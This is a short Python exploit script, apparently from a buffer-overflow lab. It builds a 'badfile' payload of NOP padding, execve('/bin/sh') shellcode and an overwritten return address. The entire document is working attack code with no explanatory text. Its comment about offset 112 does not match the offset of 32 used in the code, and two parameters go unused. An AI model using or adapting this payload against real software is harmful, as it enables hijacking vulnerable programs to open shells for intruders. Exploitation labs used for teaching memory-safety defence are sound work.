#!/usr/bin/python3
import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 
 

PARAM_1 = 20
PARAM_2 = 30
PARAM_3 = 300
 
total_ln = PARAM_3

NOPs = 0x0

distance = 32
L = 4
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(total_ln)) 
# Put the shellcode at the end 
start = total_ln - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0x5655626d + NOPs
content[distance:distance+L] = (ret).to_bytes(4,byteorder='little') 
 
with open("badfile", "wb") as f:
    f.write(content)




